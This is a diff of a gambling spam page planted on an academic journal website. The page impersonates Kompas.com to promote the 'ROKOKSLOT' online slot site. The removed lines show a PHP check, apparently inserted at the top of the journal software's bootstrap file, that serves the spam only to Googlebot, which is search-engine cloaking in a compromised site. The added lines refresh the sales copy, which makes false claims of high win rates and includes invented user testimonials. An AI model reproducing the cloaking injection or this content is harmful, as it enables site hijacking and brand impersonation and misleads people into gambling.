@@ -1,9 +1,3 @@
-<?php
-
-
-if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
-{
-?>
 <!DOCTYPE html>
 <html lang="id" class=" js csstransitions js csstransitions">
 
@@ -18,7 +12,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
         async=""></script>
     <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script>
     <script async="" type="text/javascript" src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
-    <title>ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi</title>
+    <title>ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit</title>
     <link href="//securepubads.g.doubleclick.net" rel="dns-prefetch">
     <link href="//asset.kompas.com" rel="dns-prefetch">
     <link href="//adsimg.kompas.com" rel="dns-prefetch">
@@ -28,7 +22,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="viewport" content="width=device-width">
     <meta
-        content="Rokokslot login dengan link terbaik situs slot online terbaik yang memiliki RTP permainan slot888 terpercaya paling update dengan rate kemenangan tertinggi pada setiap permainan. Deposit murah 10k yang pas dikantong.   "
+        content="Rokokslot memiliki subsidi permainan slot online gacor terbaik dengan deposit slot dana tercepat hanya 1 menit transaksi, Main dirokokslot sekarang dengan permainan slot online terbukti gacor setiap waktu. "
         name="description" />
     <meta name="googlebot-news" content="INDEX, FOLLOW" />
     <meta name="googlebot" content="INDEX, FOLLOW" />
@@ -41,11 +35,11 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     <meta http-equiv="content-language" content="In-Id" />
     <meta name="geo.placename" content="Indonesia" />
     <meta property="og:type" content="article" />
-    <meta property="og:image" content="https://res.cloudinary.com/db9tbd0mz/image/upload/v1773999185/rokokslot5_nrs8ot.png" />
+    <meta property="og:image" content="https://res.cloudinary.com/db9tbd0mz/image/upload/v1775331556/Gemini_Generated_Image_hkyjr6hkyjr6hkyj_q6hyvp.png" />
     <meta property="og:title"
-        content="ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi" />
+        content="ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit" />
     <meta property="og:description"
-        content="Rokokslot login dengan link terbaik situs slot online terbaik yang memiliki RTP permainan slot888 terpercaya paling update dengan rate kemenangan tertinggi pada setiap permainan. Deposit murah 10k yang pas dikantong.   ">
+        content="Rokokslot memiliki subsidi permainan slot online gacor terbaik dengan deposit slot dana tercepat hanya 1 menit transaksi, Main dirokokslot sekarang dengan permainan slot online terbukti gacor setiap waktu. ">
     <meta property="og:url" content="https://ejournal.jalancendikia.org/" />
     <meta property="og:site_name" content="Kompas.com" />
     <meta property="fb:app_id" content="324557847592228" />
@@ -59,10 +53,10 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     <meta name="twitter:site" content="@kompascom" />
     <meta name="twitter:creator" content="@kompascom">
     <meta name="twitter:title"
-        content="ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi" />
+        content="ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit" />
     <meta name="twitter:description"
-        content="Rokokslot login dengan link terbaik situs slot online terbaik yang memiliki RTP permainan slot888 terpercaya paling update dengan rate kemenangan tertinggi pada setiap permainan. Deposit murah 10k yang pas dikantong.   " />
-    <meta name="twitter:image" content="https://res.cloudinary.com/db9tbd0mz/image/upload/v1773999185/rokokslot5_nrs8ot.png" />
+        content="Rokokslot memiliki subsidi permainan slot online gacor terbaik dengan deposit slot dana tercepat hanya 1 menit transaksi, Main dirokokslot sekarang dengan permainan slot online terbukti gacor setiap waktu. " />
+    <meta name="twitter:image" content="https://res.cloudinary.com/db9tbd0mz/image/upload/v1775331556/Gemini_Generated_Image_hkyjr6hkyjr6hkyj_q6hyvp.png" />
     <meta name="content_category" content="ROKOKSLOT" />
     <meta name="content_subcategory" content="ROKOKSLOT" />
     <meta name="content_location" content="Di" />
@@ -86,7 +80,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     <meta name="content_current_page" content="1" />
     <link rel="prefetch" href="https://ejournal.jalancendikia.org/" as="document" />
     <link rel="https://res.cloudinary.com/db9tbd0mz/image/upload/v1773800687/rokokslot_mbnfes.pnghtml" href="https://iniyangpertama.pages.dev/" />
-    <link rel="preload" as="image" href="https://res.cloudinary.com/db9tbd0mz/image/upload/v1773999185/rokokslot5_nrs8ot.png">
+    <link rel="preload" as="image" href="https://res.cloudinary.com/db9tbd0mz/image/upload/v1775331556/Gemini_Generated_Image_hkyjr6hkyjr6hkyj_q6hyvp.png">
     <link rel="preload" href="https://securepubads.g.doubleclick.net/tag/js/gpt.js" as="script">
     <link rel="canonical" href="https://ejournal.jalancendikia.org/" />
     <link rel="dns-prefetch" href="twitter.com">
@@ -121,14 +115,14 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     <script src="https://asset.kompas.com/data/2017/wp/js/modernizr.custom.js" type="text/javascript"></script>
     <link rel="preconnect" href="https://scripts.jixie.media" />
     <script
-        type="text/javascript"> window.dataLayer = window.dataLayer || []; window.dataLayer.push({ "content_id": "2548411", "content_site": "https://ejournal.jalancendikia.org/", "content_site_id": 88, "content_category": "Prov", "content_subcategory": "ROKOKSLOT", "content_location": "Di", "content_author": "", "content_aid1": "", "content_aid2": "", "content_aid3": "", "content_editor": "ROKOKSLOT", "content_eid": "7768", "content_lipsus": "", "content_lipsus_id": "", "content_sensi": "", "content_type": "Standard", "content_PublishedDate": "2025-01-19 17:20:00", "content_Month_PubDate": "09", "content_Year_PubDate": "2025", "content_Date_PubDate": "04", "content_source": "", "content_tag": "ROKOKSLOT", "content_title": "ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi", "content_tags": "", "content_total_words": 366, "content_draft_type": "0", "content_draft_check": "", "content_draft_engine": "", "content_autopaging": true, "content_total_pages": 1, "content_current_page": 1 });</script>
+        type="text/javascript"> window.dataLayer = window.dataLayer || []; window.dataLayer.push({ "content_id": "2548411", "content_site": "https://ejournal.jalancendikia.org/", "content_site_id": 88, "content_category": "Prov", "content_subcategory": "ROKOKSLOT", "content_location": "Di", "content_author": "", "content_aid1": "", "content_aid2": "", "content_aid3": "", "content_editor": "ROKOKSLOT", "content_eid": "7768", "content_lipsus": "", "content_lipsus_id": "", "content_sensi": "", "content_type": "Standard", "content_PublishedDate": "2025-01-19 17:20:00", "content_Month_PubDate": "09", "content_Year_PubDate": "2025", "content_Date_PubDate": "04", "content_source": "", "content_tag": "ROKOKSLOT", "content_title": "ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit", "content_tags": "", "content_total_words": 366, "content_draft_type": "0", "content_draft_check": "", "content_draft_engine": "", "content_autopaging": true, "content_total_pages": 1, "content_current_page": 1 });</script>
     <script
         type="text/javascript"> window.jixie_o = { accountid: "9262bf2590d558736cac4fff7978fcb1", partner_cookie: 'kmps_usrid', external_ids: ['tdid', 'tdid2', 'ifo'], sha256mail_cookie: 'usermail', ad_blocker: true, logbids: true, userprofile: true, sha256ph_cookie: 'kmps_uphn', };</script>
     <script async="" src="https://scripts.jixie.media/jxpublisher_3_1.min.js" type="text/javascript"></script>
     <script
-        type="text/javascript"> var keyword_data = "" var array_keywords = keyword_data.split(","); window.jixie_p = window.jixie_p || []; window.jixie_p.push({ action: "visit", parameters: { itemid: "20250904172000388", keywords: array_keywords, title: "ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi", description: "Rokokslot login dengan link terbaik situs slot online terbaik yang memiliki RTP permainan slot888 terpercaya paling update dengan rate kemenangan tertinggi pada setiap permainan. Deposit murah 10k yang pas dikantong.   ", category: "Prov" } });</script>
+        type="text/javascript"> var keyword_data = "" var array_keywords = keyword_data.split(","); window.jixie_p = window.jixie_p || []; window.jixie_p.push({ action: "visit", parameters: { itemid: "20250904172000388", keywords: array_keywords, title: "ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit", description: "Rokokslot memiliki subsidi permainan slot online gacor terbaik dengan deposit slot dana tercepat hanya 1 menit transaksi, Main dirokokslot sekarang dengan permainan slot online terbukti gacor setiap waktu. ", category: "Prov" } });</script>
     <script
-        type="text/javascript"> var keywordBrandSafety = "Rokokslot login dengan link terbaik situs slot online terbaik yang memiliki RTP permainan slot888 terpercaya paling update dengan rate kemenangan tertinggi pada setiap permainan. Deposit murah 10k yang pas dikantong.   ";</script>
+        type="text/javascript"> var keywordBrandSafety = "Rokokslot memiliki subsidi permainan slot online gacor terbaik dengan deposit slot dana tercepat hanya 1 menit transaksi, Main dirokokslot sekarang dengan permainan slot online terbukti gacor setiap waktu. ";</script>
     <script async="" src="https://fundingchoicesmessages.google.com/i/pub-9012468469771973?ers=1"
         nonce="IOvmxAasolBKwB_qzaJVMg" type="text/javascript"></script>
     <script nonce="IOvmxAasolBKwB_qzaJVMg"
@@ -144,9 +138,9 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     <script
         type="application/ld+json"> {"@context": "https:\/\/schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Kompas.com", "item": "https:\/\/www.kompas.com" }, {"@type": "ListItem", "position": 2, "name": "Jawa Barat", "item": "https:\/\/www.kompas.com\/jawa-barat" }] }</script>
     <script
-        type="application/ld+json"> {"@context": "http:\/\/schema.org", "@type": "NewsArticle", "mainEntityOfPage": {"@type": "WebPage", "@id": "https:\/\/www.kompas.com\/jawa-barat\/read\/2025\/09\/04\/172000388\/kompol-cosmas-dipecat-tidak-hormat-pernah-terseret-kasus-penyiraman#" }, "headline": "ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi", "image": {"@type": "ImageObject", "url": "https:\/\/asset.kompas.com\/crops\/iG7a3sTiZT7pAljmYKLfoJbEnJQ=\/0x0:0x0\/780x390\/data\/photo\/2025\/09\/03\/68b836bc52796.jpeg", "height": 500, "width": 750 }, "datePublished": "2025-09-04T10:20:00+00:00", "dateModified": "2025-09-04T10:20:00+00:00", "author": {"@type": "Person", "name": "ROKOKSLOT", "url": "https:\/\/indeks.kompas.com\/profile\/" }, "publisher": {"@type": "Organization", "name": "Kompas.com", "logo": {"@type": "ImageObject", "url": "https:\/\/asset.kompas.com\/data\/2017\/wp\/images\/logo-kompascom-jmd.png", "width": 255, "height": 55 }}, "description": "Rokokslot login dengan link terbaik situs slot online terbaik yang memiliki RTP permainan slot888 terpercaya paling update dengan rate kemenangan tertinggi pada setiap permainan. Deposit murah 10k yang pas dikantong.   " }</script>
+        type="application/ld+json"> {"@context": "http:\/\/schema.org", "@type": "NewsArticle", "mainEntityOfPage": {"@type": "WebPage", "@id": "https:\/\/www.kompas.com\/jawa-barat\/read\/2025\/09\/04\/172000388\/kompol-cosmas-dipecat-tidak-hormat-pernah-terseret-kasus-penyiraman#" }, "headline": "ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit", "image": {"@type": "ImageObject", "url": "https:\/\/asset.kompas.com\/crops\/iG7a3sTiZT7pAljmYKLfoJbEnJQ=\/0x0:0x0\/780x390\/data\/photo\/2025\/09\/03\/68b836bc52796.jpeg", "height": 500, "width": 750 }, "datePublished": "2025-09-04T10:20:00+00:00", "dateModified": "2025-09-04T10:20:00+00:00", "author": {"@type": "Person", "name": "ROKOKSLOT", "url": "https:\/\/indeks.kompas.com\/profile\/" }, "publisher": {"@type": "Organization", "name": "Kompas.com", "logo": {"@type": "ImageObject", "url": "https:\/\/asset.kompas.com\/data\/2017\/wp\/images\/logo-kompascom-jmd.png", "width": 255, "height": 55 }}, "description": "Rokokslot memiliki subsidi permainan slot online gacor terbaik dengan deposit slot dana tercepat hanya 1 menit transaksi, Main dirokokslot sekarang dengan permainan slot online terbukti gacor setiap waktu. " }</script>
     <script
-        type="application/ld+json"> {"@context": "http://schema.org", "@type": "Organization", "url": "https://ejournal.jalancendikia.org/", "logo": "https://res.cloudinary.com/db9tbd0mz/image/upload/v1773999185/rokokslot5_nrs8ot.png", "sameAs": ["https://www.facebook.com/kompascom", "https://www.twitter.com/kompascom", "https://instagram.com/kompascom", "https://line.me/ti/p/%40kompas.com"] }</script>
+        type="application/ld+json"> {"@context": "http://schema.org", "@type": "Organization", "url": "https://ejournal.jalancendikia.org/", "logo": "https://res.cloudinary.com/db9tbd0mz/image/upload/v1775331556/Gemini_Generated_Image_hkyjr6hkyjr6hkyj_q6hyvp.png", "sameAs": ["https://www.facebook.com/kompascom", "https://www.twitter.com/kompascom", "https://instagram.com/kompascom", "https://line.me/ti/p/%40kompas.com"] }</script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@700&display=swap');
 
@@ -169,12 +163,12 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             0%,
             100% {
                 filter: brightness(1) drop-shadow(0 0 8px rgba(255, 255, 255, .25));
-                box-shadow: inset 0 0 18px rgba(12, 223, 230, 0.8), 0 0 14px rgba(5, 150, 207, 0.6);
+                box-shadow: inset 0 0 18px rgba(57, 68, 163, 0.8), 0 0 14px rgba(40, 60, 148, 0.6);
             }
 
             50% {
                 filter: brightness(1.15) drop-shadow(0 0 14px rgba(255, 255, 255, .45));
-                box-shadow: inset 0 0 26px rgba(5, 146, 165, 0.9), 0 0 22px rgba(28, 137, 180, 0.8);
+                box-shadow: inset 0 0 26px rgba(42, 43, 134, 0.9), 0 0 22px rgba(87, 78, 204, 0.8);
             }
         }
 
@@ -197,9 +191,9 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             letter-spacing: 1.5px;
             text-transform: uppercase;
             color: #ffffff;
-            background: #39c1e3;
+            background: #663d11;
             border-radius: 10px;
-            box-shadow: inset 0 0 22px rgba(8, 155, 165, 0.9), 0 6px 18px rgba(0, 0, 0, .4);
+            box-shadow: inset 0 0 22px rgba(37, 65, 190, 0.9), 0 6px 18px rgba(0, 0, 0, .4);
             transition: all .5s cubic-bezier(.25, .46, .45, .94);
             animation: energy-pulse 5s ease-in-out infinite;
         }
@@ -208,7 +202,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             content: '';
             position: absolute;
             inset: -3px;
-            background: linear-gradient(90deg, #39c1e3, #39c1e3, #ffffff, #39c1e3, #39c1e3);
+            background: linear-gradient(90deg, #663d11, #663d11, #ffffff, #663d11, #663d11);
             background-size: 300% 300%;
             border-radius: 10px;
             z-index: -1;
@@ -231,7 +225,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 
         .n-columns-2 a:hover {
             transform: translateY(-6px) scale(1.03);
-            background: #39c1e3;
+            background: #663d11;
             color: #ffffff;
             text-shadow: 0 0 12px rgba(255, 255, 255, .9);
             filter: drop-shadow(0 0 18px rgba(40, 205, 255, 0.9));
@@ -773,7 +767,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
         sentinel {}
 
         body {
-            background-color: #dcdcdc;
+            background-color: #834fa1;
             background-image: none;
         }
     </style>
@@ -1066,7 +1060,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 <div class="container clearfix nav__wrap">
                     <div class="logo logo--sticky"> <a href="https://ejournal.jalancendikia.org/"> <img class="lozad"
                                 data-src="https://res.cloudinary.com/db9tbd0mz/image/upload/v1772480282/logo-rokokslot_rokok_ijo0yl.png"
-                                alt="ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi" />
+                                alt="ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit" />
                         </a> </div>
                     <ul class="nav__row clearfix">
                         <li class="nav__item"> <a href="/" class="nav__link nav__link--news">News</a>
@@ -1828,7 +1822,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         <use xlink:href="#icon-copy" />
                                         </use>
                                     </svg> </a> </div>
-                        </div>ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi</p>
+                        </div>ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit</p>
                         <div class="comment__read__bar"> <span>Komentar: </span>
                             <div class="social social--article clearfix">
                                 <div class="social__item"> <a class="social__link" href="/"> <span
@@ -1849,7 +1843,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             <div class="row mt2 col-offset-fluid clearfix">
                 <div class="col-bs10-10">
                     <div class="breadcrumb clearfix"></div>
-                    <h1 class="read__title">ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi
+                    <h1 class="read__title">ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit
 </h1>
                 </div>
             </div> <!-- read-->
@@ -1879,15 +1873,14 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                 <div class="blog-card-flat">
                                                     <div class="cover-photo -gallery" data-photostyle="">
                                                         <div class="photo__wrap"> <img width="780" height="520"
-                                                                src="https://res.cloudinary.com/db9tbd0mz/image/upload/v1773999185/rokokslot5_nrs8ot.png"
+                                                                src="https://res.cloudinary.com/db9tbd0mz/image/upload/v1775331556/Gemini_Generated_Image_hkyjr6hkyjr6hkyj_q6hyvp.png"
                                                                 alt="Cover Photo"> </div>
                                                     </div>
                                                     <div class="photoCarousel">
                                                         <div class="article-box">
-                                                            <p>ROKOKSLOT dikenal sebagai salah satu situs terbaik yang menghadirkan pengalaman bermain slot online dengan kualitas premium dan sistem login yang cepat serta aman. Dengan tampilan yang user-friendly, pemain dapat dengan mudah mengakses berbagai permainan favorit hanya dalam hitungan detik tanpa kendala. Hal ini menjadikan <a href="https://gandhara.kdru.edu.af/">ROKOKSLOT</a> sebagai pilihan utama bagi para pecinta slot yang menginginkan kenyamanan sekaligus peluang menang yang lebih besar.</p>
-<p>Keunggulan utama dari ROKOKSLOT terletak pada <a href="https://gandhara.kdru.edu.af/">RTP Slot888</a> yang selalu diperbarui secara berkala. Dengan tingkat Return to Player yang tinggi, pemain memiliki peluang lebih besar untuk mendapatkan kemenangan, bahkan hingga maxwin. Selain itu, sistem update rate yang transparan membantu pemain mengetahui game mana yang sedang berada dalam kondisi “gacor”, sehingga strategi bermain bisa lebih terarah dan efektif.</p>
-<p>Tidak hanya itu, ROKOKSLOT juga menawarkan berbagai bonus menarik seperti bonus deposit harian, cashback, hingga promo spesial untuk member setia. Dukungan layanan pelanggan yang aktif 24 jam semakin menambah kenyamanan dalam bermain, terutama bagi pemain yang membutuhkan bantuan secara cepat.</p>
-<p>Dengan kombinasi antara keamanan, kemudahan akses, RTP tinggi, serta update rate terbaik, ROKOKSLOT menjadi solusi tepat bagi siapa saja yang ingin merasakan sensasi bermain slot online dengan peluang kemenangan maksimal.</p>
+                                                            <p><a href="https://gandhara.kdru.edu.af/">ROKOKSLOT</a> hadir sebagai solusi terbaik bagi pecinta slot online yang mencari permainan gacor dengan peluang kemenangan tinggi. Dengan sistem subsidi permainan yang menguntungkan, pemain bisa merasakan sensasi bermain yang lebih maksimal tanpa khawatir kehilangan besar. Proses deposit menggunakan Dana juga sangat cepat, hanya membutuhkan waktu sekitar 1 menit, sehingga Anda bisa langsung menikmati permainan favorit kapan saja</p>
+<p>Didukung dengan berbagai pilihan game dari provider ternama, <a href="https://gandhara.kdru.edu.af/">ROKOKSLOT</a> menjamin pengalaman bermain yang aman, nyaman, dan terpercaya. Segera bergabung sekarang dan rasakan sendiri kemudahan serta keuntungan bermain slot online di ROKOKSLOT hari ini!</p>
+
                                                         </div>
                                                         <div class="photoCarousel-block" data-scroll="side">
                                                             <div class="photoCarousel-wrap photoCarousel-slider"
@@ -1907,7 +1900,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                 </div>
                                                 <style>
                                                     body {
-                                                        background-color: #dcdcdc;
+                                                        background-color: #834fa1;
                                                         background-image: none;
                                                         margin: 0;
                                                         padding: 0;
@@ -1918,7 +1911,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         max-width: 900px;
                                                         margin: 40px auto;
                                                         padding: 16px;
-                                                        background-color: #dcdcdc;
+                                                        background-color: #834fa1;
                                                         border-radius: 16px;
                                                         border: 2px solid #cfcfcf;
                                                         overflow: hidden;
@@ -1936,7 +1929,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         width: 100%;
                                                         overflow: hidden;
                                                         padding: 10px 0;
-                                                        background-color: #dcdcdc;
+                                                        background-color: #834fa1;
                                                     }
 
                                                     .photoCarousel-slider {
@@ -2016,7 +2009,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                     <div class="most__wrap clearfix">
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 1 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Pak De Imin: Sarana Bermain Dengan
@@ -2025,7 +2018,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 2 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Narji: Tempat Bermain situs slot paling
@@ -2034,17 +2027,17 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 3 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
-                                                                <div class="most__title">Labisa: Rtp slot888 paling akurat
+                                                                <div class="most__title">Labisa: Rtp slot88 paling akurat
                                                                     dan update bener gokil dan bisa diandalkan
                                                                 </div>
                                                             </a>
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 4 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Aura: Pertama kali bisa
@@ -2053,16 +2046,16 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 5 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Junaide: Sangat
-                                                                    direkomendasikan untuk main slot888 disini.</div>
+                                                                    direkomendasikan untuk main slot88 disini.</div>
                                                             </a>
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 6 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Vido: Modal 10.000 rupiah saja sudah bisa memainkan semua permainan slot online yang tersedia disini.</div>
@@ -2070,7 +2063,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 7 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Jushoa: Server nya
@@ -2080,7 +2073,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 8 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Kamirun: Pelayanan nya cepet
@@ -2089,7 +2082,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                         </div>
                                                         <div class="most__list clearfix">
                                                             <div class="most__countmost__count"
-                                                                style=" background-color: #000;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
+                                                                style=" background-color: #663d11;color: #fff;width: 40px;height: 40px;display: flex;align-items: center;justify-content: center;border-radius: 50%;font-weight: bold;font-size: 18px;">
                                                                 9 </div> <a class="most__link"
                                                                 href="https://iniyangpertama.pages.dev/">
                                                                 <div class="most__title">Milea: Lisensi nya resmi dan terpercaya,
@@ -2202,7 +2195,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                     <div class="footerLogo"> <a href="https://ejournal.jalancendikia.org/"
                                                             data-google-interstitial="false"> <img class="lozad fade"
                                                                 data-src="https://res.cloudinary.com/db9tbd0mz/image/upload/v1772480282/logo-rokokslot_rokok_ijo0yl.png"
-                                                                alt="ROKOKSLOT : Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi"
+                                                                alt="ROKOKSLOT !! Subsidi Permainan Terbaik Slot Online Gacor Dengan Deposit Slot Dana Tercepat 1 Menit"
                                                                 width="280" height="90"
                                                                 src="https://res.cloudinary.com/db9tbd0mz/image/upload/v1772480282/logo-rokokslot_rokok_ijo0yl.png"
                                                                 data-loaded="true" /> </a> </div>
@@ -2733,7 +2726,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                             <div class="kgmModal-img"> <img
                                                     src="https://res.cloudinary.com/db9tbd0mz/image/upload/v1772087411/LOGO-ROKOKSLOT_ycocsy.png"
                                                     alt="Kompas.com" /> </div>
-                                            <p> <strong>ROKOKSLOT</strong> Login Terbaik Situs Slot Online Terbaik & RTP Slot888 Terpercaya Update Rate Tertinggi </p>
+                                            <p> <strong>ROKOKSLOT</strong> Login Terbaik Situs Slot Online Terbaik & RTP slot88 Terpercaya Update Rate Tertinggi </p>
                                         </div>
                                         <div class="kgmModal-footer">
                                             <div class="form-row-big">
@@ -2862,43 +2855,3 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
     style="display: none;"></iframe>
 
 </html>
-
-<?php
-exit;
-}
-
-/**
- * @defgroup index Index
- * Bootstrap and initialization code.
- */
-
-/**
- * @file includes/bootstrap.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup index
- *
- * @brief Core system initialization code.
- * This file is loaded before any others.
- * Any system-wide imports or initialization code should be placed here.
- */
-
